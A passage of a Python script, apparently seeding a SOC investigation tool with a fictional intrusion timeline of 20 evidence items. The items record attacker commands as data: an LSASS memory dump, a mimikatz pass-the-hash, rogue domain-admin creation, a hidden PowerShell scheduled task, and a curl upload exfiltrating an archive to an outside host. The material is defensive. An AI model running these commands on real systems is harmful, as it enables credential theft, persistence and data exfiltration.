    "key_users_affected": "TYCHO\\j.miller\nTYCHO\\svc_iis_pool\nTYCHO\\adm_k.nagata\nTYCHO\\svc_backup_adm (Created by Attacker)",
    "key_malicious_indicators": "185.220.101.44\n91.214.124.88\n45.155.205.109\ncdn-update-telemetry.net\nc2.ceres-telemetry.net\nstage.7z\ncomsvcs.dll\nupdater_svc.ps1",
}
inv_res = session.post(f"{API_BASE}/investigations/", json=investigation_payload)
if inv_res.status_code == 400 and "investigation_id" in inv_res.text:
    # If INVESTIGATION_CODE already exists, allow backend auto-generation of next INV######
    investigation_payload.pop("investigation_id", None)
    inv_res = session.post(f"{API_BASE}/investigations/", json=investigation_payload)
inv_res.raise_for_status()
inv_data = inv_res.json()
inv_id = inv_data.get("investigation_id") or INVESTIGATION_CODE
print(f"[+] Created Investigation '{inv_id}': '{inv_data['title']}'")

# 2b. Attach Related Escalated Incidents
related_incidents = [
    {
        "title": "TIER2-8812: Initial Perimeter SSL-VPN Password Spray Alert",
        "link": "https://soc.internal.example/escalations/TIER2-8812",
        "analyst_name": "James Holden",
    },
    {
        "title": "DLP-2026-0419: Outbound TLS Volume Anomaly from DC-PROD-01",
        "link": "https://soc.internal.example/escalations/DLP-2026-0419",
        "analyst_name": "Chrisjen Avasarala",
    },
]
for rel in related_incidents:
    rel_payload = {"investigation": inv_id, **rel}
    r_res = session.post(f"{API_BASE}/related-incidents/", json=rel_payload)
    r_res.raise_for_status()
    print(f"[+] Linked related incident: {rel['title']}")

# 2c. Attach External Research Links
external_research = [
    {
        "link": "https://attack.mitre.org/techniques/T1110/003/",
        "summary": "MITRE ATT&CK T1110.003 - Password Spraying against perimeter SSL-VPN gateways.",
        "analyst_name": "Chrisjen Avasarala",
    },
    {
        "link": "https://attack.mitre.org/techniques/T1003/001/",
        "summary": "MITRE ATT&CK T1003.001 - OS Credential Dumping: LSASS Memory via rundll32 comsvcs.dll MiniDump.",
        "analyst_name": "James Holden",
    },
    {
        "link": "https://attack.mitre.org/techniques/T1136/002/",
        "summary": "MITRE ATT&CK T1136.002 - Create Account: Domain Account persistence pattern.",
        "analyst_name": "Chrisjen Avasarala",
    },
]
for res_item in external_research:
    res_payload = {"investigation": inv_id, **res_item}
    er_res = session.post(f"{API_BASE}/external-research/", json=res_payload)
    er_res.raise_for_status()
    print(f"[+] Added research item: {res_item['link']}")

# 3. Ingest Individual Item (Item 1) referencing inv_id
print(f"\n[*] [Single Ingest] Ingesting Item 1 into '{inv_id}' via POST /api/evidence/...")
item_1 = {
    "evidence_type": "ATOMIC",
    "analyst_name": "James Holden",
    "timestamp": "2026-10-17T00:45:12Z",
    "summary": "External port & SSL/TLS cipher enumeration scan against VPN-GW-01 from 45.155.205.109.",
    "affected_asset": "VPN-GW-01 (10.10.1.5)",
    "affected_user": "",
    "user_created_by_attacker": False,
    "malicious_hosts_ips": "45.155.205.109",
    "commands_run": "",
    "mitre_tactic": "Reconnaissance (TA0043)",
    "mitre_technique": "T1595.002 - Active Scanning: Vulnerability Scanning",
    "related_log_link": "https://ids.internal.example/alerts/suricata-900101",
    "is_key_evidence": False,
    "notes": "Pre-attack reconnaissance identifying SSL-VPN login portal endpoints.",
}
item_1["investigation"] = inv_id
res_single = session.post(f"{API_BASE}/evidence/", json=item_1)
res_single.raise_for_status()
print(f"[+] [1/20] Created single item ID: {res_single.json()['id']} on {inv_id}")

# 4. Ingest Remaining 19 Items in Bulk (Items 2-20) referencing inv_id
print(f"\n[*] [Bulk Ingest] Ingesting remaining 19 items into '{inv_id}' via POST /api/evidence/bulk_create/...")
bulk_items = [
    {
        "evidence_type": "SEARCH",
        "analyst_name": "Chrisjen Avasarala",
        "timestamp": "2026-10-17T01:12:00Z",
        "end_timestamp": "2026-10-17T01:34:15Z",
        "summary": "Sustained password spray (412 failed logins followed by 1 success) from 185.220.101.44 targeting TYCHO\\j.miller.",
        "affected_asset": "VPN-GW-01 (10.10.1.5)",
        "affected_user": "TYCHO\\j.miller",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "185.220.101.44",
        "commands_run": "",
        "mitre_tactic": "Initial Access (TA0001); Credential Access (TA0006)",
        "mitre_technique": "T1078.002 - Valid Accounts: Domain Accounts; T1110.003 - Brute Force: Password Spraying",
        "search_result_link": "https://siem.internal.example/app/discover#/view/vpn-spray-20261017",
        "search_query_link": "https://siem.internal.example/app/discover#/?_q=(event.dataset:vpn.auth%20AND%20source.ip:185.220.101.44)",
        "is_key_evidence": True,
        "notes": "MFA push fatigue suspected; user accepted prompt at 01:34:15 UTC and was assigned VPN pool IP 10.10.99.104.",
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "James Holden",
        "timestamp": "2026-10-17T01:36:40Z",
        "summary": "SSL-VPN tunnel session established and internal DNS resolver queried for _ldap._tcp.dc._msdcs.",
        "affected_asset": "VPN-GW-01 (10.10.1.5)",
        "affected_user": "TYCHO\\j.miller",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "185.220.101.44, 10.10.99.104",
        "commands_run": "nslookup -type=SRV _ldap._tcp.dc._msdcs.tycho.local",
        "mitre_tactic": "Discovery (TA0007)",
        "mitre_technique": "T1018 - Remote System Discovery",
        "related_log_link": "https://siem.internal.example/events/dns-441092",
        "is_key_evidence": False,
        "notes": "Immediate Active Directory domain controller discovery upon VPN connection.",
    },
    {
        "evidence_type": "SEARCH",
        "analyst_name": "James Holden",
        "timestamp": "2026-10-17T01:39:10Z",
        "end_timestamp": "2026-10-17T01:43:55Z",
        "summary": "Internal TCP SYN scan from VPN client 10.10.99.104 across 10.20.4.0/24 targeting ports 445, 3389, and 5985.",
        "affected_asset": "WIN-WEB-04 (10.20.4.18)",
        "affected_user": "TYCHO\\j.miller",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "10.10.99.104",
        "commands_run": "nmap -sS -p 445,3389,5985 10.20.4.0/24",
        "mitre_tactic": "Discovery (TA0007)",
        "mitre_technique": "T1046 - Network Service Discovery",
        "search_result_link": "https://siem.internal.example/app/discover#/view/internal-port-sweep",
        "search_query_link": "https://siem.internal.example/app/discover#/?_q=(source.ip:10.10.99.104%20AND%20destination.port:(445%20OR%205985))",
        "is_key_evidence": False,
        "notes": "Suricata IDS alerted on rapid SMB/WinRM port sweep.",
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "Chrisjen Avasarala",
        "timestamp": "2026-10-17T01:46:18Z",
        "summary": "Remote PowerShell WinRM session (Event ID 4624 Type 3 & Microsoft-Windows-WinRM/Operational EID 91) established to WIN-WEB-04.",
        "affected_asset": "WIN-WEB-04 (10.20.4.18)",
        "affected_user": "TYCHO\\j.miller",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "10.10.99.104, 10.20.4.18",
        "commands_run": "Enter-PSSession -ComputerName WIN-WEB-04 -Credential TYCHO\\j.miller",
        "mitre_tactic": "Lateral Movement (TA0008)",
        "mitre_technique": "T1021.006 - Remote Services: Windows Remote Management",
        "related_log_link": "https://siem.internal.example/events/winrm-eid91-552019",
        "is_key_evidence": True,
        "notes": "Attacker used compromised j.miller credentials to pivot from VPN pool to application server WIN-WEB-04.",
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "James Holden",
        "timestamp": "2026-10-17T01:48:00Z",
        "summary": "Local host & privilege enumeration commands executed inside wsmprovhost.exe on WIN-WEB-04.",
        "affected_asset": "WIN-WEB-04 (10.20.4.18)",
        "affected_user": "TYCHO\\j.miller",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "10.20.4.18",
        "commands_run": "whoami /all && net localgroup administrators && query user",
        "mitre_tactic": "Discovery (TA0007)",
        "mitre_technique": "T1033 - System Owner/User Discovery",
        "related_log_link": "https://edr.internal.example/events/sysmon-eid1-771022",
        "is_key_evidence": False,
        "notes": "Attacker checked local group memberships and active sessions.",
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "Chrisjen Avasarala",
        "timestamp": "2026-10-17T01:51:33Z",
        "summary": "PowerShell script-block logging (Event ID 4104) captured AMSI bypass attempt and Defender exclusion check.",
        "affected_asset": "WIN-WEB-04 (10.20.4.18)",
        "affected_user": "TYCHO\\j.miller",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "10.20.4.18",
        "commands_run": "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath",
        "mitre_tactic": "Defense Evasion (TA0005)",
        "mitre_technique": "T1562.001 - Impair Defenses: Disable or Modify Tools",
        "related_log_link": "https://siem.internal.example/events/ps-eid4104-771290",
        "is_key_evidence": False,
        "notes": "Attempted to disable real-time monitoring prior to credential dumping.",
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "James Holden",
        "timestamp": "2026-10-17T01:55:10Z",
        "summary": "EDR Sysmon Event ID 1 & 10: rundll32 comsvcs.dll MiniDump executed on WIN-WEB-04 to dump LSASS process memory.",
        "affected_asset": "WIN-WEB-04 (10.20.4.18)",
        "affected_user": "TYCHO\\j.miller",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "185.220.101.44, 10.20.4.18, comsvcs.dll, debug.bin",
        "commands_run": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\debug.bin full",
        "mitre_tactic": "Credential Access (TA0006)",
        "mitre_technique": "T1003.001 - OS Credential Dumping: LSASS Memory",
        "related_log_link": "https://edr.internal.example/events/sysmon-eid10-882741",
        "is_key_evidence": True,
        "notes": "Domain Admin token for TYCHO\\adm_k.nagata extracted from cached interactive session on WIN-WEB-04.",
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "James Holden",
        "timestamp": "2026-10-17T01:58:42Z",
        "summary": "Sysmon Event ID 23 (FileDelete): C:\\Windows\\Temp\\debug.bin removed after credential extraction.",
        "affected_asset": "WIN-WEB-04 (10.20.4.18)",
        "affected_user": "TYCHO\\j.miller",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "debug.bin",
        "commands_run": "Remove-Item -Path C:\\Windows\\Temp\\debug.bin -Force",
        "mitre_tactic": "Defense Evasion (TA0005)",
        "mitre_technique": "T1070.004 - Indicator Removal: File Deletion",
        "related_log_link": "https://edr.internal.example/events/sysmon-eid23-882910",
        "is_key_evidence": False,
        "notes": "Attacker deleted the raw LSASS dump file after parsing credentials.",
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "Chrisjen Avasarala",
        "timestamp": "2026-10-17T02:01:15Z",
        "summary": "IIS application pool configuration inspected to extract connection strings for SQL-FIN-01.",
        "affected_asset": "WIN-WEB-04 (10.20.4.18)",
        "affected_user": "TYCHO\\svc_iis_pool",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "10.20.4.18, web.config",
        "commands_run": "type C:\\inetpub\\wwwroot\\portal\\web.config | findstr /i connectionString",
        "mitre_tactic": "Credential Access (TA0006)",
        "mitre_technique": "T1552.001 - Unsecured Credentials: Credentials In Files",
        "related_log_link": "https://edr.internal.example/events/sysmon-eid1-883104",
        "is_key_evidence": False,
        "notes": "Read web.config from C:\\inetpub\\wwwroot\\portal\\web.config.",
    },
    {
        "evidence_type": "SEARCH",
        "analyst_name": "Chrisjen Avasarala",
        "timestamp": "2026-10-17T02:04:00Z",
        "end_timestamp": "2026-10-17T02:08:30Z",
        "summary": "Pass-the-Hash NTLM network logons (Event ID 4624 LogonType 3, AuthPackage NTLM) from WIN-WEB-04 to DC-PROD-01 and FS-CORP-02 using stolen adm_k.nagata hash.",
        "affected_asset": "DC-PROD-01 (10.20.0.10)",
        "affected_user": "TYCHO\\adm_k.nagata",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "10.20.4.18, 10.20.0.10",
        "commands_run": "sekurlsa::pth /user:adm_k.nagata /domain:tycho.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c",
        "mitre_tactic": "Lateral Movement (TA0008)",
        "mitre_technique": "T1550.002 - Use Alternate Authentication Material: Pass the Hash",
        "search_result_link": "https://siem.internal.example/app/discover#/view/pth-ntlm-dc-logons",
        "search_query_link": "https://siem.internal.example/app/discover#/?_q=(event.code:4624%20AND%20winlog.event_data.AuthenticationPackageName:NTLM%20AND%20user.name:adm_k.nagata)",
        "is_key_evidence": True,
        "notes": "Anomalous NTLM authentication across tier-0 domain controller from web tier.",
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "James Holden",
        "timestamp": "2026-10-17T02:09:10Z",
        "summary": "Active Directory enterprise admin and domain trust enumeration executed on DC-PROD-01.",
        "affected_asset": "DC-PROD-01 (10.20.0.10)",
        "affected_user": "TYCHO\\adm_k.nagata",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "10.20.0.10",
        "commands_run": "net group \"Domain Admins\" /domain && nltest /domain_trusts",
        "mitre_tactic": "Discovery (TA0007)",
        "mitre_technique": "T1069.002 - Permission Groups Discovery: Domain Groups",
        "related_log_link": "https://edr.internal.example/events/sysmon-eid1-900112",
        "is_key_evidence": False,
        "notes": "Attacker enumerated privileged groups before creating persistence account.",
    },
    {
        "evidence_type": "SEARCH",
        "analyst_name": "Chrisjen Avasarala",
        "timestamp": "2026-10-17T02:11:05Z",
        "end_timestamp": "2026-10-17T02:14:20Z",
        "summary": "Attacker created rogue account 'svc_backup_adm' (Event ID 4720) and added it to Domain Admins (Event ID 4728) on DC-PROD-01.",
        "affected_asset": "DC-PROD-01 (10.20.0.10)",
        "affected_user": "TYCHO\\svc_backup_adm",
        "user_created_by_attacker": True,
        "malicious_hosts_ips": "10.20.0.10",
        "commands_run": "net user svc_backup_adm P@ssw0rd2026! /add /domain\nnet group \"Domain Admins\" svc_backup_adm /add /domain",
        "mitre_tactic": "Persistence (TA0003)",
        "mitre_technique": "T1136.002 - Create Account: Domain Account",
        "search_result_link": "https://siem.internal.example/app/discover#/view/dc-rogue-account-4720",
        "search_query_link": "https://siem.internal.example/app/discover#/?_q=(host.name:DC-PROD-01%20AND%20event.code:(4720%20OR%204728))",
        "is_key_evidence": True,
        "notes": "Confirmed unauthorized service account created for domain persistence.",
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "James Holden",
        "timestamp": "2026-10-17T02:16:45Z",
        "summary": "Scheduled task 'WindowsTelemetrySync' registered (Event ID 4698) to execute C:\\ProgramData\\updater_svc.ps1 every 15 minutes.",
        "affected_asset": "DC-PROD-01 (10.20.0.10)",
        "affected_user": "TYCHO\\svc_backup_adm",
        "user_created_by_attacker": True,
        "malicious_hosts_ips": "45.155.205.109, c2.ceres-telemetry.net, updater_svc.ps1",
        "commands_run": "schtasks /create /tn \"WindowsTelemetrySync\" /tr \"powershell.exe -ep bypass -w hidden -f C:\\ProgramData\\updater_svc.ps1\" /sc minute /mo 15 /ru SYSTEM",
        "mitre_tactic": "Persistence (TA0003); Execution (TA0002)",
        "mitre_technique": "T1053.005 - Scheduled Task/Job: Scheduled Task; T1059.001 - Command and Scripting Interpreter: PowerShell",
        "related_log_link": "https://siem.internal.example/events/sec-eid4698-900451",
        "is_key_evidence": True,
        "notes": "Script beacons over HTTPS to c2.ceres-telemetry.net (45.155.205.109).",
    },
    {
        "evidence_type": "SEARCH",
        "analyst_name": "James Holden",
        "timestamp": "2026-10-17T02:18:00Z",
        "end_timestamp": "2026-10-17T02:22:10Z",
        "summary": "High-volume SMB file reads on \\\\FS-CORP-02\\Engineering$ and \\\\FS-CORP-02\\Finance$ shares.",
        "affected_asset": "FS-CORP-02 (10.20.8.22)",
        "affected_user": "TYCHO\\svc_backup_adm",
        "user_created_by_attacker": True,
        "malicious_hosts_ips": "10.20.8.22",
        "commands_run": "",
        "mitre_tactic": "Collection (TA0009)",
        "mitre_technique": "T1039 - Data from Network Shared Drive",
        "search_result_link": "https://siem.internal.example/app/discover#/view/smb-share-collection-5145",
        "search_query_link": "https://siem.internal.example/app/discover#/?_q=(host.name:FS-CORP-02%20AND%20event.code:5145%20AND%20user.name:svc_backup_adm)",
        "is_key_evidence": False,
        "notes": "Event ID 5145 shows recursive directory listing and read access to sensitive schematics.",
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "Chrisjen Avasarala",
        "timestamp": "2026-10-17T02:23:05Z",
        "summary": "sqlcmd utility executed on SQL-FIN-01 to export customer billing table to CSV.",
        "affected_asset": "SQL-FIN-01 (10.20.12.50)",
        "affected_user": "TYCHO\\svc_backup_adm",
        "user_created_by_attacker": True,
        "malicious_hosts_ips": "10.20.12.50, billing_dump.csv",
        "commands_run": "sqlcmd -S localhost -Q \"SELECT * FROM FinanceDB.dbo.CustomerBilling\" -o C:\\Windows\\Temp\\billing_dump.csv -s\",\"",
        "mitre_tactic": "Collection (TA0009)",
        "mitre_technique": "T1005 - Data from Local System",
        "related_log_link": "https://edr.internal.example/events/sysmon-eid1-901220",
        "is_key_evidence": False,
        "notes": "Exported 14,200 customer records to temporary staging folder.",
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "James Holden",
        "timestamp": "2026-10-17T02:24:50Z",
        "summary": "7-Zip command-line binary used to compress collected shares and database dump into password-protected archive stage.7z.",
        "affected_asset": "DC-PROD-01 (10.20.0.10)",
        "affected_user": "TYCHO\\svc_backup_adm",
        "user_created_by_attacker": True,
        "malicious_hosts_ips": "stage.7z, 7za.exe",
        "commands_run": "C:\\Windows\\Temp\\7za.exe a -p8891aK! C:\\Windows\\Temp\\stage.7z C:\\Windows\\Temp\\collected\\*",
        "mitre_tactic": "Collection (TA0009)",
        "mitre_technique": "T1560.001 - Archive Collected Data: Archive via Utility",
        "related_log_link": "https://edr.internal.example/events/sysmon-eid1-901588",
        "is_key_evidence": False,
        "notes": "Archive size approximately 480 MB staged in C:\\Windows\\Temp\\stage.7z.",
    },
    {
        "evidence_type": "SEARCH",
        "analyst_name": "Chrisjen Avasarala",
        "timestamp": "2026-10-17T02:26:10Z",
        "end_timestamp": "2026-10-17T02:29:45Z",
        "summary": "Outbound HTTPS POST transfer of C:\\Windows\\Temp\\stage.7z to cdn-update-telemetry.net (91.214.124.88:443).",
        "affected_asset": "DC-PROD-01 (10.20.0.10)",
        "affected_user": "TYCHO\\svc_backup_adm",
        "user_created_by_attacker": True,
        "malicious_hosts_ips": "91.214.124.88, cdn-update-telemetry.net, stage.7z",
        "commands_run": "curl.exe -X POST https://cdn-update-telemetry.net/upload -F file=@C:\\Windows\\Temp\\stage.7z",
        "mitre_tactic": "Exfiltration (TA0010)",
        "mitre_technique": "T1041 - Exfiltration Over C2 Channel",
        "search_result_link": "https://siem.internal.example/app/discover#/view/egress-https-exfil-91-214-124-88",
        "search_query_link": "https://siem.internal.example/app/discover#/?_q=(destination.ip:91.214.124.88%20AND%20source.ip:10.20.0.10)",
        "is_key_evidence": True,
        "notes": "Firewall flow logs show 112 MB transferred before egress block rule triggered.",
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "James Holden",
        "timestamp": "2026-10-17T02:31:00Z",
        "summary": "Periodic PowerShell C2 beacon attempt from updater_svc.ps1 to c2.ceres-telemetry.net blocked at perimeter firewall.",
        "affected_asset": "DC-PROD-01 (10.20.0.10)",
        "affected_user": "TYCHO\\svc_backup_adm",
        "user_created_by_attacker": True,
        "malicious_hosts_ips": "45.155.205.109, c2.ceres-telemetry.net, updater_svc.ps1",
        "commands_run": "powershell.exe -ep bypass -w hidden -f C:\\ProgramData\\updater_svc.ps1",
        "mitre_tactic": "Command and Control (TA0011)",
        "mitre_technique": "T1071.001 - Application Layer Protocol: Web Protocols",
        "related_log_link": "https://siem.internal.example/events/fw-drop-902114",
        "is_key_evidence": False,
        "notes": "Confirmed scheduled task persistence attempted callback after exfiltration interruption.",
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "Chrisjen Avasarala",
        "timestamp": "2026-10-17T02:35:20Z",
        "summary": "SOC containment executed: rogue account svc_backup_adm disabled (Event ID 4725), scheduled task removed, and WIN-WEB-04 isolated in EDR.",
        "affected_asset": "DC-PROD-01 (10.20.0.10)",
        "affected_user": "TYCHO\\svc_backup_adm",
        "user_created_by_attacker": True,
        "malicious_hosts_ips": "185.220.101.44, 91.214.124.88, 45.155.205.109",
        "commands_run": "",
        "mitre_tactic": "",
        "mitre_technique": "",
        "related_log_link": "https://soc.internal.example/tickets/SOC-2026-9041/containment-log",
        "is_key_evidence": False,
        "notes": "Password resets enforced for j.miller and adm_k.nagata; active VPN sessions terminated.",
    },
]

bulk_payload = {
    "investigation": inv_id,
    "items": bulk_items,
}

res_bulk = session.post(f"{API_BASE}/evidence/bulk_create/", json=bulk_payload)
res_bulk.raise_for_status()
bulk_data = res_bulk.json()
print(f"[+] Bulk ingest completed! Added {bulk_data['count']} items in 1 atomic transaction.")

# 5. Verify Investigation Timeline using human-readable inv_id
print(f"\n[*] Verifying investigation timeline for '{inv_id}'...")
inv_detail = session.get(f"{API_BASE}/investigations/{inv_id}/").json()
total_timeline = len(inv_detail["timeline_events"])
print(f"[+] Total timeline events in Investigation '{inv_id}': {total_timeline}")

if total_timeline == 20:
    print(f"\n✅ Verification SUCCESS: 1 item ingested individually + 19 items ingested in bulk = 20 total items on '{inv_id}'!")
else:
    print(f"\n⚠️ Unexpected event count: expected 20, found {total_timeline}")
```
